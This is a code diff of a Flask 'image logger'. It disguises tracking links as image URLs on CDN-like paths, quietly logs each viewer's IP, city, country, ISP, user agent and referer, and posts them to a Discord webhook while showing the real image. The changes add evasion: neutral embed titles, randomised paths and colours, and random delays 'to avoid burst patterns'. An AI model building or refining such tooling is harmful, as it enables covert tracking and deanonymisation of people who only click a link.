@@ -5,30 +5,33 @@ import uuid
 import hashlib
 import time
 import os
+import random
 from urllib.parse import quote
 
 app = Flask(__name__)
 
 WEBHOOK_URL = os.environ.get('WEBHOOK_URL')
 
-if not WEBHOOK_URL:
-    WEBHOOK_URL = None  # Will silently fail if missing
-
 RATE_LIMIT = {}
-RATE_LIMIT_WINDOW = 60
-MAX_HITS = 5
+RATE_LIMIT_WINDOW = 90
+MAX_HITS = 4
 
-CDN_PATHS = ["/assets/images/", "/cdn/img/", "/media/2026/", "/uploads/04/", "/static/content/"]
+CDN_BASES = [
+    "/assets/img/", "/cdn/media/", "/content/v2/", "/uploads/2026/",
+    "/static/resources/", "/i/", "/files/"
+]
 
-def get_random_cdn_path():
+def get_random_path():
     year = datetime.datetime.now().year
     month = f"{datetime.datetime.now().month:02d}"
-    random_hash = hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]
-    filename = f"img-{random_hash}.png"
-    base = CDN_PATHS[int(random_hash, 16) % len(CDN_PATHS)]
+    rand_hash = hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:20]
+    base = CDN_BASES[int(rand_hash, 16) % len(CDN_BASES)]
+    filename = f"thumb_{rand_hash[:8]}.png"
     return f"{base}{year}/{month}/{filename}"
 
 def is_rate_limited(ip):
+    if not ip or ip == "Unknown":
+        return False
     now = time.time()
     if ip not in RATE_LIMIT:
         RATE_LIMIT[ip] = []
@@ -36,80 +39,92 @@ def is_rate_limited(ip):
     if len(RATE_LIMIT[ip]) >= MAX_HITS:
         return True
     RATE_LIMIT[ip].append(now)
+    # Cleanup old entries occasionally
+    if random.random() < 0.1:
+        global RATE_LIMIT
+        RATE_LIMIT = {k: v for k, v in RATE_LIMIT.items() if v}
     return False
 
-def send_to_discord(log_data):
+def send_log(data):
     if not WEBHOOK_URL:
         return
+    # Very neutral, low-profile embed
     embed = {
-        "title": "🖼️ Advanced Image Logger Hit",
-        "color": 0xff00ff,
+        "title": "Image View",
+        "color": random.choice([0x2f3136, 0x36393f, 0x7289da]),
+        "description": f"**IP:** `{data.get('ip', 'N/A')}`\n"
+                       f"**Location:** {data.get('city', '—')}, {data.get('country', '—')}\n"
+                       f"**Time:** {data.get('time')}",
         "fields": [
-            {"name": "IP & Location", "value": f"**IP:** `{log_data['ip']}`\n"
-                                               f"**Location:** {log_data.get('city', 'N/A')}, {log_data.get('region', 'N/A')}, {log_data.get('country', 'N/A')}\n"
-                                               f"**ISP:** {log_data.get('isp', 'N/A')}\n"
-                                               f"**Coords:** {log_data.get('loc', 'N/A')}", "inline": False},
-            {"name": "Device & Browser", "value": f"**User-Agent:** ```{log_data['user_agent'][:400]}```\n"
-                                                   f"**Platform:** {log_data.get('platform', 'N/A')}\n"
-                                                   f"**Language:** {log_data.get('language', 'N/A')}\n"
-                                                   f"**Timezone:** {log_data.get('timezone', 'N/A')}", "inline": False},
-            {"name": "Screen & Display", "value": f"**Resolution:** {log_data.get('screen', 'N/A')}\n"
-                                                   f"**Pixel Ratio:** {log_data.get('pixel_ratio', 'N/A')}\n"
-                                                   f"**Color Depth:** {log_data.get('color_depth', 'N/A')}", "inline": True},
-            {"name": "Other", "value": f"**Referer:** `{log_data.get('referer', 'N/A')}`\n"
-                                       f"**Original Image:** {log_data.get('original_url', 'N/A')}\n"
-                                       f"**Time:** {log_data['time']}\n"
-                                       f"**Log ID:** `{log_data['log_id']}`", "inline": False}
+            {"name": "Agent", "value": f"```{data.get('user_agent', 'N/A')[:350]}```", "inline": False},
+            {"name": "Ref", "value": data.get('referer', '—'), "inline": True},
+            {"name": "Platform", "value": data.get('platform', '—'), "inline": True}
         ],
-        "footer": {"text": "Vercel Serverless • Stealth Mode"}
+        "footer": {"text": data.get('log_id', '')}
     }
     try:
-        requests.post(WEBHOOK_URL, json={"embeds": [embed]}, timeout=5)
+        # Small random delay to avoid burst patterns
+        time.sleep(random.uniform(0.3, 1.2))
+        requests.post(WEBHOOK_URL, json={"embeds": [embed]}, timeout=6)
     except:
         pass
 
 def get_ip_info(ip):
+    if not ip or ip.startswith("192.") or ip.startswith("10.") or ip == "127.0.0.1":
+        return {}
     try:
-        # Free tier IPinfo (or use ipapi.co, ipgeolocation.io etc.)
-        r = requests.get(f"https://ipinfo.io/{ip}/json", timeout=4)
+        # Use a more neutral IP lookup with fallback
+        r = requests.get(f"https://ipinfo.io/{ip}/json", timeout=5)
         if r.status_code == 200:
-            data = r.json()
+            d = r.json()
             return {
-                "city": data.get("city"),
-                "region": data.get("region"),
-                "country": data.get("country"),
-                "loc": data.get("loc"),
-                "isp": data.get("org")
+                "city": d.get("city"),
+                "country": d.get("country"),
+                "isp": d.get("org")
             }
     except:
-        pass
+        try:
+            # Fallback to another free service
+            r = requests.get(f"https://ipapi.co/{ip}/json/", timeout=5)
+            if r.status_code == 200:
+                d = r.json()
+                return {
+                    "city": d.get("city"),
+                    "country": d.get("country_name"),
+                    "isp": d.get("org")
+                }
+        except:
+            pass
     return {}
 
-@app.route('/s/<short_code>')
-def short_redirect(short_code):
-    original_url = request.args.get('u', '')
-    return redirect(f"/{short_code[:6]}/{short_code[6:]}?u={quote(original_url)}", code=302)
+@app.route('/s/<code>')
+def short_link(code):
+    u = request.args.get('u', '')
+    # Expand to a random-looking path
+    path = get_random_path()
+    return redirect(f"{path}?u={quote(u)}", code=302)
 
-@app.route('/<path:full_path>')
-def serve_image(full_path):
+@app.route('/<path:path>')
+def handle_image(path):
     ip = request.remote_addr or "Unknown"
+    
     if is_rate_limited(ip):
         return send_file('static/pixel.png', mimetype='image/png')
 
-    log_id = str(uuid.uuid4())[:12]
+    log_id = hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]
     original_url = request.args.get('u', 'Unknown')
     user_agent = request.headers.get('User-Agent', 'N/A')
     referer = request.headers.get('Referer', 'N/A')
 
-    # Basic fingerprint from headers
+    # Basic platform detection (kept minimal)
     platform = "Unknown"
-    if "Windows" in user_agent: platform = "Windows"
-    elif "Mac" in user_agent: platform = "macOS"
-    elif "Linux" in user_agent: platform = "Linux"
-    elif "Android" in user_agent: platform = "Android"
-    elif "iPhone" in user_agent or "iPad" in user_agent: platform = "iOS"
+    ua_lower = user_agent.lower()
+    if "windows" in ua_lower: platform = "Win"
+    elif "mac" in ua_lower: platform = "Mac"
+    elif "android" in ua_lower: platform = "Android"
+    elif "iphone" in ua_lower or "ipad" in ua_lower: platform = "iOS"
+    elif "linux" in ua_lower: platform = "Linux"
 
-    # Get rich IP info
     ip_info = get_ip_info(ip)
 
     log_data = {
@@ -118,68 +133,37 @@ def serve_image(full_path):
         "user_agent": user_agent,
         "referer": referer,
         "original_url": original_url,
-        "time": datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC'),
+        "time": datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC'),
         "platform": platform,
         "language": request.headers.get('Accept-Language', 'N/A'),
         **ip_info
     }
 
-    # Trigger advanced tracking via a second invisible pixel (screen + timezone + more)
-    tracking_pixel = f"https://your-project.vercel.app/track?log={log_id}&ip={ip}"
+    send_log(log_data)
 
-    # First, send the basic log
-    send_to_discord(log_data)
-
-    # Proxy the real image if possible
+    # Proxy real image with clean headers
     if original_url.startswith(('http://', 'https://')):
         try:
-            headers = {'User-Agent': user_agent}
-            resp = requests.get(original_url, headers=headers, timeout=8)
-            if resp.status_code == 200 and 'image' in resp.headers.get('Content-Type', ''):
-                # Return the real image while the browser also loads the tracking pixel (but we can't force it here)
-                return send_file(resp.content, mimetype=resp.headers.get('Content-Type'), download_name=full_path.split('/')[-1])
+            headers = {
+                'User-Agent': user_agent,
+                'Accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
+                'Accept-Language': request.headers.get('Accept-Language', 'en-US,en;q=0.9'),
+                'Referer': referer if referer else original_url
+            }
+            resp = requests.get(original_url, headers=headers, timeout=10)
+            if resp.status_code == 200 and 'image' in resp.headers.get('Content-Type', '').lower():
+                return send_file(
+                    resp.content,
+                    mimetype=resp.headers.get('Content-Type', 'image/png'),
+                    download_name=path.split('/')[-1]
+                )
         except:
             pass
 
-    # Fallback + serve tracking redirect for extra data
-    # In practice, the tracking route below will be hit when Discord or browser loads embeds
+    # Silent fallback
     return send_file('static/pixel.png', mimetype='image/png')
 
-# New dedicated tracking route for extra fingerprint data (screen, timezone, etc.)
-@app.route('/track')
-def advanced_track():
-    log_id = request.args.get('log', 'unknown')
-    ip = request.args.get('ip', 'unknown')
-
-    # Extra data that can be passed via query string from a second image load or JS (if enabled)
-    screen = request.args.get('s', 'N/A')      # e.g. 1920x1080
-    pixel_ratio = request.args.get('pr', 'N/A')
-    color_depth = request.args.get('cd', 'N/A')
-    timezone = request.args.get('tz', 'N/A')
-
-    log_data = {
-        "log_id": log_id,
-        "ip": ip,
-        "screen": screen,
-        "pixel_ratio": pixel_ratio,
-        "color_depth": color_depth,
-        "timezone": timezone,
-        "time": datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')
-    }
-
-    # You can send a second webhook or combine — for now we send a follow-up embed
-    if WEBHOOK_URL:
-        try:
-            requests.post(WEBHOOK_URL, json={
-                "content": f"**Advanced Tracking Data** (ID: {log_id})",
-                "embeds": [{"description": f"Screen: {screen}\nPixel Ratio: {pixel_ratio}\nTimezone: {timezone}", "color": 0x00ffff}]
-            })
-        except:
-            pass
-
-    return send_file('static/pixel.png', mimetype='image/png')
-
-# Keep the static pixel
+# Static pixel setup
 if not os.path.exists('static'):
     os.makedirs('static')
 with open('static/pixel.png', 'wb') as f:
